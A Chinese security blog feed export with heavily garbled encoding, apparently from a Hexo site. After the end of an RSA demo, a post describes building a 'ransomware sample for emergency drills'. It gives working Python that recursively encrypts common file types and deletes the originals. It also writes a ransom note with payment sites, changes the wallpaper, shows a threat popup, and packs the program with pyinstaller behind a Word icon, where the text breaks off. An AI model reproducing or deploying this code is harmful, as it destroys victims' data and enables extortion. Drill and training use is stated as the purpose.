class="line"><span class="keyword">from</span> Crypto.Signature <span class="keyword">import</span> pkcs1_15</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key_pair</span>():</span><br><span class="line">    key = RSA.generate(<span class="number">2048</span>)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">message, public_key</span>):</span><br><span class="line">    cipher = PKCS1_OAEP.new(public_key)</span><br><span class="line">    ciphertext = cipher.encrypt(message.encode())</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ciphertext, private_key</span>):</span><br><span class="line">    cipher = PKCS1_OAEP.new(private_key)</span><br><span class="line">    plaintext = cipher.decrypt(ciphertext)</span><br><span class="line">    <span class="keyword">return</span> plaintext.decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">message, private_key</span>):</span><br><span class="line">    hash_obj = SHA256.new(message.encode())</span><br><span class="line">    signature = pkcs1_15.new(private_key).sign(hash_obj)</span><br><span class="line">    <span class="keyword">return</span> signature</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">message, signature, public_key</span>):</span><br><span class="line">    hash_obj = SHA256.new(message.encode())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pkcs1_15.new(public_key).verify(hash_obj, signature)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> (ValueError, TypeError):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¤ºä¾‹</span></span><br><span class="line">message = <span class="string">&quot;Hello, world!&quot;</span></span><br><span class="line">key_pair = generate_key_pair()</span><br><span class="line">public_key = key_pair.publickey()</span><br><span class="line">private_key = key_pair</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ å¯†</span></span><br><span class="line">ciphertext = encrypt(message, public_key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Ciphertext:&quot;</span>, ciphertext.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># è§£å¯†</span></span><br><span class="line">plaintext = decrypt(ciphertext, private_key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Plaintext:&quot;</span>, plaintext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç­¾å</span></span><br><span class="line">signature = sign(message, private_key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Signature:&quot;</span>, signature.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># éªŒè¯ç­¾å</span></span><br><span class="line">is_valid = verify(message, signature, public_key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Signature is valid:&quot;</span>, is_valid)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JSé€†å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JSé€†å‘ </tag>
            
            <tag> å°ç¨‹åº </tag>
            
            <tag> RSA+AES </tag>
            
            <tag> æ•°å­—ä¿¡å° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åº”æ€¥æ¼”ç»ƒå‹’ç´¢æ ·æœ¬å‚è€ƒ</title>
      <link href="/2024/06/06/%E5%BA%94%E6%80%A5%E6%BC%94%E7%BB%83%E5%8B%92%E7%B4%A2%E6%A0%B7%E6%9C%AC%E5%8F%82%E8%80%83/"/>
      <url>/2024/06/06/%E5%BA%94%E6%80%A5%E6%BC%94%E7%BB%83%E5%8B%92%E7%B4%A2%E6%A0%B7%E6%9C%AC%E5%8F%82%E8%80%83/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="ä¸€-ç®€ä»‹"><a href="#ä¸€-ç®€ä»‹" class="headerlink" title="ä¸€ ç®€ä»‹"></a>ä¸€ ç®€ä»‹</h1><p>å‹’ç´¢ç—…æ¯’ï¼ˆRansomwareï¼‰ç¡®å®æ˜¯ä¸€ç§å¸¸è§çš„ç½‘ç»œæ”»å‡»æ‰‹æ®µï¼Œå®ƒä¼šé€šè¿‡åŠ å¯†å—å®³è€…ç”µè„‘ä¸Šçš„æ•°æ®æ¥ç˜«ç—ªå—å®³è€…çš„ç³»ç»Ÿï¼Œå¹¶ä»¥æ­¤å‹’ç´¢èµé‡‘ã€‚è¿™ç§æ¶æ„è½¯ä»¶çš„æ”»å‡»å¯¹è±¡å¯ä»¥æ˜¯ä¸ªäººç”¨æˆ·ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¼ä¸šã€æ”¿åºœæœºæ„ç­‰ã€‚ä¸€æ—¦æ•°æ®è¢«åŠ å¯†ï¼Œé™¤éæ”¯ä»˜èµé‡‘ä»¥è·å–è§£å¯†å¯†é’¥ï¼Œå¦åˆ™è¿™äº›æ•°æ®å°†æ— æ³•è¢«æ­£å¸¸è®¿é—®ã€‚</p><p>éšç€äº’è”ç½‘æŠ€æœ¯çš„å‘å±•å’Œç½‘ç»œç¯å¢ƒçš„æ—¥ç›Šå¤æ‚ï¼Œç½‘ç»œå®‰å…¨é—®é¢˜è¶Šæ¥è¶Šå—åˆ°é‡è§†ã€‚ä¸ä»…å…¬å¸ï¼ŒåŒ…æ‹¬æ”¿åºœå’Œä¸ªäººç”¨æˆ·éƒ½åœ¨å¢å¼ºç½‘ç»œå®‰å…¨æ„è¯†ï¼Œé‡‡å–å„ç§æªæ–½æ¥é¢„é˜²å’Œåº”å¯¹å‹’ç´¢ç—…æ¯’ç­‰ç½‘ç»œå¨èƒã€‚åº”æ€¥æ¼”ç»ƒå°±ç»å¸¸é‡åˆ°çš„ä¸€ç§ï¼Œæ¨¡æ‹ŸçœŸå®çš„æ”»å‡»åœºæ™¯ï¼Œè®©å›¢é˜Ÿæˆå‘˜åœ¨å®é™…æ“ä½œä¸­åº”ç”¨åº”æ€¥é¢„æ¡ˆï¼Œæ£€éªŒåº”å¯¹èƒ½åŠ›ã€‚</p><h1 id="äºŒ-Pythonå®ç°ç®€æ˜“å‹’ç´¢ç—…æ¯’"><a href="#äºŒ-Pythonå®ç°ç®€æ˜“å‹’ç´¢ç—…æ¯’" class="headerlink" title="äºŒ Pythonå®ç°ç®€æ˜“å‹’ç´¢ç—…æ¯’"></a>äºŒ Pythonå®ç°ç®€æ˜“å‹’ç´¢ç—…æ¯’</h1><h3 id="ç”Ÿæˆç”¨äºåŠ è§£å¯†çš„å…¬ç§é’¥"><a href="#ç”Ÿæˆç”¨äºåŠ è§£å¯†çš„å…¬ç§é’¥" class="headerlink" title="ç”Ÿæˆç”¨äºåŠ è§£å¯†çš„å…¬ç§é’¥"></a>ç”Ÿæˆç”¨äºåŠ è§£å¯†çš„å…¬ç§é’¥</h3><p>ç”Ÿæˆ1024ä½ RSAå…¬ç§é’¥ å¹¶ä¿å­˜ä¸º.pemï¼Œå…ˆåœ¨æœ¬åœ°ç”Ÿæˆï¼Œå°†ç”Ÿæˆçš„å…¬é’¥å’ŒåŠ å¯†ç¨‹åºä¸€èµ·æ‰“åŒ…å‘é€ç»™å—å®³è€…å³å¯</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"> </span><br><span class="line"><span class="comment"># ç”Ÿäº§1024ä½å…¬ç§é’¥å¹¶ä¿å­˜ä¸º.pem  å…ˆåœ¨æœ¬åœ°ç”Ÿæˆï¼Œå°†ç”Ÿæˆçš„å…¬é’¥å’ŒåŠ å¯†ç¨‹åºä¸€èµ·æ‰“åŒ…å‘é€åˆ°å—å®³è€…å³å¯</span></span><br><span class="line">pub, priv = rsa.newkeys(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">pub = pub.save_pkcs1()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;./keys/pubkey.pem&quot;</span>, mode=<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(pub)</span><br><span class="line"></span><br><span class="line">priv = priv.save_pkcs1()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;./keys/privkey.pem&quot;</span>, mode=<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(priv)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061740163.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061740434.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061741742.png" alt="image.png"> </p><h3 id="åŠ å¯†æ–‡ä»¶"><a href="#åŠ å¯†æ–‡ä»¶" class="headerlink" title="åŠ å¯†æ–‡ä»¶"></a>åŠ å¯†æ–‡ä»¶</h3><p>1ã€å®šä¹‰è¦åŠ å¯†æ–‡ä»¶çš„ç±»å‹</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061741086.png" alt="image.png"> </p><p>è¿™å—åŠ å¯†å¸¸è§çš„å‡ ç§æ–‡ä»¶ç±»å‹ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#é¢„å®šä¹‰æƒ³è¦åŠ å¯†çš„æ–‡ä»¶åç¼€åï¼Œå¯ä»¥è‡ªå·±é€‰æ‹©</span><br><span class="line">target_list_str = &quot;.txt .lnk .pdf .jpg .png .jpeg .doc .docx .xls .xlsx .ppt .pptx .zip .exe&quot;</span><br></pre></td></tr></table></figure><p>2ã€å®šä¹‰å‡½æ•°ï¼Œå®ç°åŠ å¯†è¿‡ç¨‹</p><p>ä¼ å…¥éœ€è¦åŠ å¯†çš„æ–‡ä»¶åï¼Œè°ƒç”¨RSAå…¬é’¥ï¼Œå¯¹æ–‡ä»¶å†…å®¹è¿›è¡ŒåŠ å¯†ã€‚</p><p>åˆ é™¤åŸå§‹æ–‡ä»¶ï¼Œå¹¶å°†æ–°ç”ŸæˆåŠ å¯†åçš„æ–‡ä»¶å‘½åä¸º .enc çš„åç¼€</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åŠ å¯†è¿‡ç¨‹</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_encrypt</span>(<span class="params">filename</span>):</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> filename.split(<span class="string">&quot;.&quot;</span>)[-<span class="number">1</span>] <span class="keyword">in</span> target_list:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./pubkey.pem&quot;</span>) <span class="keyword">as</span> file:  <span class="comment">#åŠ è½½RSAå…¬é’¥ï¼Œå‡†å¤‡åŠ å¯†</span></span><br><span class="line">            pub = file.read()</span><br><span class="line">            pub = rsa.PublicKey.load_pkcs1(pub)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, mode=<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            data = file.read()</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># åˆ é™¤åŸå§‹æ–‡ä»¶</span></span><br><span class="line">        os.remove(filename)</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">117</span>):</span><br><span class="line">            res.append(rsa.encrypt(data[i:i + <span class="number">117</span>], pub))</span><br><span class="line">        byte_data = <span class="string">b&#x27;&#x27;</span>.join(res)</span><br><span class="line">        byte_data = base64.b64encode(byte_data).decode()</span><br><span class="line"> </span><br><span class="line">        filename = filename + <span class="string">&quot;.enc&quot;</span> <span class="comment">#åŠ å¯†åçš„æ–‡ä»¶åç¼€åæ”¹ä¸º.enc</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, mode=<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(byte_data)</span><br></pre></td></tr></table></figure><p>3ã€ä¸Šé¢ç¬¬äºŒæ­¥å®ç°çš„æ˜¯å¯¹å•ä¸ªæ–‡ä»¶çš„åŠ å¯†ï¼Œä½†ä¸€èˆ¬å‹’ç´¢ç—…æ¯’ï¼Œè¦åŠ å¯†å®ç°çš„æ˜¯å…¨ç›˜åŠ å¯†ã€‚</p><p>è¿™å—æ˜¯åº”æ€¥æ¼”ç»ƒä½¿ç”¨ï¼Œæ‰€ä»¥ï¼Œä¸€èˆ¬æ˜¯åŠ å¯†æŸä¸ªæ–‡ä»¶å¤¹ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ã€‚è¿™å—å°±éœ€è¦åˆ—å‡ºå½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œå¾ªç¯ä½¿ç”¨rsa_encryptå‡½æ•°å®ç°æ–‡ä»¶åŠ å¯†</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä¸»è¦ä½œç”¨å°±æ˜¯åˆ—å‡ºæ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰æ–‡ä»¶ï¼Œå®ç°å…¨æ–‡ä»¶åŠ å¯†</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">if</span> os.path.isdir(file_path):</span><br><span class="line">        file_names = os.listdir(file_path)</span><br><span class="line">        <span class="keyword">for</span> file_name <span class="keyword">in</span> file_names:</span><br><span class="line">            file_name = os.path.join(file_path, file_name)</span><br><span class="line">            <span class="keyword">if</span> os.path.isdir(file_name):</span><br><span class="line">                encrypt(file_name)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                rsa_encrypt(file_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rsa_encrypt(file_path)</span><br></pre></td></tr></table></figure><p>3ã€å®šä¹‰ä¸»å‡½æ•°mainï¼Œå®ç°å¯¹æŒ‡å®šæ–‡ä»¶å¤¹åŠ å¯†</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    target_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> target_list_str.split(<span class="string">&quot;.&quot;</span>):</span><br><span class="line">        target_list.append(i.strip())</span><br><span class="line"> </span><br><span class="line">     encrypt(<span class="string">&quot;C:\\Users\\analysis\\Desktop\\test&quot;</span>) <span class="comment">#æ­¤å¤„è‡ªå®šä¹‰æƒ³è¦åŠ å¯†çš„ç›®å½•åç§°</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªæµ‹è¯•æ–‡ä»¶å¤¹testï¼Œé‡Œé¢å­˜æ”¾ä¸€äº›å¸¸è§çš„æ–‡ä»¶ç±»å‹</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061742682.png" alt="image.png"> </p><p>æ‰§è¡Œè„šæœ¬åï¼Œå†æ¬¡æŸ¥çœ‹è¯¥æ–‡ä»¶å¤¹ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061742689.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061742746.png" alt="image.png"> </p><p>åˆ°è¿™å„¿ï¼Œå°±å·²ç»å®ç°äº†å‹’ç´¢ç—…æ¯’æœ€é‡è¦çš„æ–‡ä»¶åŠ å¯†éƒ¨åˆ†äº†ã€‚</p><h3 id="è„šæœ¬ä¼˜åŒ–"><a href="#è„šæœ¬ä¼˜åŒ–" class="headerlink" title="è„šæœ¬ä¼˜åŒ–"></a>è„šæœ¬ä¼˜åŒ–</h3><p>è¿™å—çš„ä¼˜åŒ–ï¼Œä¸»è¦ä½œç”¨æ˜¯å®ç°ä¸€äº›å…¶ä»–çš„åŠŸèƒ½ï¼Œè®©å®ƒæ›´åƒçœŸçš„å‹’ç´¢ç—…æ¯’ã€‚</p><p>ä¸‹é¢æ˜¯å‡ ä¸ªç‚¹ä¼˜åŒ–ï¼š</p><ul><li>åŠ å¯†æ–‡ä»¶åé»˜è®¤ä¸ºå‹’ç´¢ç—…æ¯’æ‰€åœ¨æ–‡ä»¶å¤¹ï¼ˆè¿™å—å†™æ­»æ˜¯ä¸ºäº†åç»­æ‰“åŒ…æˆexeçš„æ—¶å€™æ–¹ä¾¿ï¼‰</li><li>ç”Ÿæˆå‹’ç´¢ä¿¡</li><li>ç›´æ¥æ›¿æ¢å—å®³è€…æ¡Œé¢å£çº¸</li><li>è°ƒç”¨cmdå¼¹çª—ï¼Œæç¤ºå—å®³è€…â€å½“å‰ä¸»æœºè¢«å‹’ç´¢äº†â€</li></ul><h4 id="æŒ‡å®šæ–‡ä»¶å¤¹"><a href="#æŒ‡å®šæ–‡ä»¶å¤¹" class="headerlink" title="æŒ‡å®šæ–‡ä»¶å¤¹"></a>æŒ‡å®šæ–‡ä»¶å¤¹</h4><p>ç›´æ¥è°ƒç”¨osï¼Œpythonè·å–å½“å‰æ–‡ä»¶å¤¹å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–å½“å‰å·¥ä½œç›®å½•</span></span><br><span class="line">current_directory = os.getcwd()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;å½“å‰å·¥ä½œç›®å½•æ˜¯ï¼š&quot;</span>, current_directory)</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼ŒåŸä»£ç å¯ä»¥ä¿®æ”¹ä¸ºï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061744823.png" alt="image.png"> </p><p>æµ‹è¯•ä¸€ä¸‹æ•ˆæœï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061744836.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061744450.png" alt="image.png"> </p><h4 id="è°ƒç”¨Windowså¼¹çª—"><a href="#è°ƒç”¨Windowså¼¹çª—" class="headerlink" title="è°ƒç”¨Windowså¼¹çª—"></a>è°ƒç”¨Windowså¼¹çª—</h4><p>å¯ä»¥ä½¿ç”¨tkinteræ¨¡å—æ¥å®ç°ä¸€ä¸ªç®€å•çš„Windowså¼¹çª—</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061747628.png" alt="image.png"> </p><p>æ‰€ä»¥ï¼Œå¯ä»¥ä¿®æ”¹åŸè„šæœ¬ä»£ç ä¸ºï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç”Ÿæˆå‘Šè­¦å¼¹çª—</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">warnning</span>():</span><br><span class="line">    <span class="comment"># åˆå§‹åŒ–Tkinter</span></span><br><span class="line">    root = tk.Tk()</span><br><span class="line">    <span class="comment"># éšè—ä¸»çª—å£</span></span><br><span class="line">    root.withdraw()</span><br><span class="line">    <span class="comment"># å¼¹å‡ºæ¶ˆæ¯æ¡†</span></span><br><span class="line">    messagebox.showwarning(<span class="string">&quot;Warnning!!!&quot;</span>, <span class="string">&quot;æŠ±æ­‰ï¼Œä½ çš„ç”µè„‘å·²ç»è¢«æˆ‘ä»¬æ§åˆ¶ï¼Œé‡Œé¢éƒ¨åˆ†æ–‡ä»¶å·²ç»è¢«åŠ å¯†ï¼Œå¦‚æœæƒ³è¦æ¢å¤ï¼Œè¯·åŠæ—¶è”ç³»æˆ‘ä»¬~&quot;</span>)</span><br><span class="line">    <span class="comment"># å…³é—­Tkinter</span></span><br><span class="line">    root.destroy()</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061747068.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061747271.png" alt="image.png"> </p><h4 id="æ›¿æ¢æ¡Œé¢å£çº¸"><a href="#æ›¿æ¢æ¡Œé¢å£çº¸" class="headerlink" title="æ›¿æ¢æ¡Œé¢å£çº¸"></a>æ›¿æ¢æ¡Œé¢å£çº¸</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> win32gui, win32con</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_wallpaper</span>(<span class="params">image_path</span>):</span><br><span class="line">    <span class="comment"># SPI_SETDESKWALLPAPER = 20</span></span><br><span class="line">    <span class="comment"># SPIF_UPDATEINIFILE = 0x01</span></span><br><span class="line">    <span class="comment"># SPIF_SENDCHANGE = 0x02</span></span><br><span class="line">    <span class="comment"># è¿”å›å€¼ï¼šå¦‚æœå‡½æ•°è°ƒç”¨æˆåŠŸï¼Œè¿”å›å€¼éé›¶ï¼›å¦‚æœå‡½æ•°è°ƒç”¨å¤±è´¥ï¼Œè¿”å›å€¼ä¸ºé›¶ã€‚</span></span><br><span class="line">    <span class="comment"># ä¿®æ”¹æ¡Œé¢èƒŒæ™¯</span></span><br><span class="line">    <span class="keyword">return</span> win32gui.SystemParametersInfo(win32con.SPI_SETDESKWALLPAPER,</span><br><span class="line">                                          image_path,</span><br><span class="line">                                          win32con.SPIF_UPDATEINIFILE | win32con.SPIF_SENDCHANGE)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®å£çº¸çš„è·¯å¾„</span></span><br><span class="line">image_path = os.getcwd()+<span class="string">&quot;\\background.jpg&quot;</span></span><br><span class="line"><span class="comment"># print(image_path)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è°ƒç”¨å‡½æ•°è®¾ç½®å£çº¸</span></span><br><span class="line">set_wallpaper(image_path)</span><br></pre></td></tr></table></figure><h4 id="ç”Ÿæˆå‹’ç´¢ä¿¡"><a href="#ç”Ÿæˆå‹’ç´¢ä¿¡" class="headerlink" title="ç”Ÿæˆå‹’ç´¢ä¿¡"></a>ç”Ÿæˆå‹’ç´¢ä¿¡</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ–‡ä»¶å</span></span><br><span class="line">file_name = <span class="string">&quot;extortion_Readme.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¦å†™å…¥çš„å†…å®¹</span></span><br><span class="line">content = <span class="string">&quot;---=== Welcome. Again ===---\n\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;[+] What Happen? [+]\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;Your files are encrypted and currently unavailable. You can check it all files on the system do not open properly.\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;By the way, everything is possible to recover(restore), but you need to follow our instructions. Otherwise, you can&#x27;t return your data (Never).\n\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;[+] What guarantees? [+]&quot;</span>\</span><br><span class="line"><span class="string">&quot;Its just a business. We absolutely do not care you and your deals, except getting benefits. If we do not do our work and liabilities - \n&quot;</span>\</span><br><span class="line"><span class="string">&quot;nobody will not cooperate with us, Its not in our interests.\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;To check the ability of returning files, you should go to our website. there you can decrypt one file and free. That isi our guarantee.\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;If you will not cooperate with our service - for us, its does not matter. But you will lose your time and data, cause just we have the \n&quot;</span>\</span><br><span class="line"><span class="string">&quot;private key. In practice - time is much more valuable than money.\n\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;[+] How to get access on website? [+]\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;You have two ways:\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;1) [Recommended] Using a Tor brower!\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;    a) Download and install Tor brower from this site: https://torproject.org\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;    b) open our website: http://aplwbzo468w90726424023846238690283.coion/CE2937HFJJK\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;2) If Tor blocked in your country, try to use VPN! But you can use our secondary website. for this:\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;    a) Open your any brower (Chrome, Opera, IE, Edge)\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;    b) Open our secondary website: http://decryptor.cc/CE2937HFJJK\n\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;Warnning secondary website can be blocked, thats why first variant much better and more available.\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;When you open our website, put the follow data in the input form:\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;Key:\n\r&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºå¹¶å†™å…¥æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–æ–‡ä»¶çš„ç»å¯¹è·¯å¾„</span></span><br><span class="line">file_path = os.path.abspath(file_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å¼€æ–‡ä»¶</span></span><br><span class="line">os.startfile(file_path)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;æ–‡ä»¶ &#x27;<span class="subst">&#123;file_name&#125;</span>&#x27; å·²åˆ›å»ºå¹¶å†™å…¥å†…å®¹ï¼Œç°åœ¨å°†æ‰“å¼€è¯¥æ–‡ä»¶.&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061748593.png" alt="image.png"> </p><p>è¿™å—ç”Ÿæˆçš„å‹’ç´¢ä¿¡æ˜¯ txt æ ¼å¼çš„ã€‚ç„¶è€Œtxtæ ¼å¼æ˜¯åœ¨è¢«åŠ å¯†æ–‡ä»¶ç±»å‹ä¸­çš„ã€‚è¿™å—å°±ä¼šé€ æˆå†²çªã€‚</p><p>æ‰€ä»¥ï¼Œéœ€è¦ä¿®æ”¹å‰é¢çš„åŠ å¯†å‡½æ•°ï¼Œå°† â€œextortion_Readme.txtâ€ ä»åŠ å¯†æ–‡ä»¶ä¸­æ’é™¤</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä¸»è¦ä½œç”¨å°±æ˜¯åˆ—å‡ºæ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰æ–‡ä»¶ï¼Œå®ç°å…¨æ–‡ä»¶åŠ å¯†</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">if</span> os.path.isdir(file_path):</span><br><span class="line">        file_names = os.listdir(file_path)</span><br><span class="line">        <span class="keyword">for</span> file_name <span class="keyword">in</span> file_names:</span><br><span class="line">            <span class="keyword">if</span> file_name == <span class="string">&quot;extortion_Readme.txt&quot;</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            file_name = os.path.join(file_path, file_name)</span><br><span class="line">            <span class="keyword">if</span> os.path.isdir(file_name):</span><br><span class="line">                encrypt(file_name)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                rsa_encrypt(file_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rsa_encrypt(file_path)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061748290.png" alt="image.png"> </p><h3 id="ä»£ç æ‰“åŒ…æˆexe"><a href="#ä»£ç æ‰“åŒ…æˆexe" class="headerlink" title="ä»£ç æ‰“åŒ…æˆexe"></a>ä»£ç æ‰“åŒ…æˆexe</h3><h4 id="å‡†å¤‡"><a href="#å‡†å¤‡" class="headerlink" title="å‡†å¤‡"></a>å‡†å¤‡</h4><p>é¦–å…ˆå‡†å¤‡ä¸€ä¸ªiconï¼Œç”¨æ¥å¯¹ç”Ÿæˆçš„exeä¼ªè£…ï¼ˆè¿™å—ä½¿ç”¨wordæ–‡æ¡£å›¾æ ‡ï¼‰</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061749131.png" alt="img"> </p><h4 id="pyinstallerå°†èµ„æºæ–‡ä»¶æ‰“åŒ…åˆ°exeä¸­"><a href="#pyinstallerå°†èµ„æºæ–‡ä»¶æ‰“åŒ…åˆ°exeä¸­" class="headerlink" title="pyinstallerå°†èµ„æºæ–‡ä»¶æ‰“åŒ…åˆ°exeä¸­"></a>pyinstallerå°†èµ„æºæ–‡ä»¶æ‰“åŒ…åˆ°exeä¸­</h4><p>ï¼ˆ1ï¼‰é¦–å…ˆå®‰è£…pyinstaller</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install pyinstaller</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰å°†èµ„æºæ–‡ä»¶æ‰“åŒ…è¿›exeæ–‡ä»¶ä¸­</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyinstaller --add-data &#x27;./res/pubkey.pem;res&#x27; --add-data &#x27;./res/background.png;res&#x27; -i .\word.ico  -Fw .\encrypt.py</span><br></pre></td></tr></table></figure><ul><li>â€“add-data åŠ 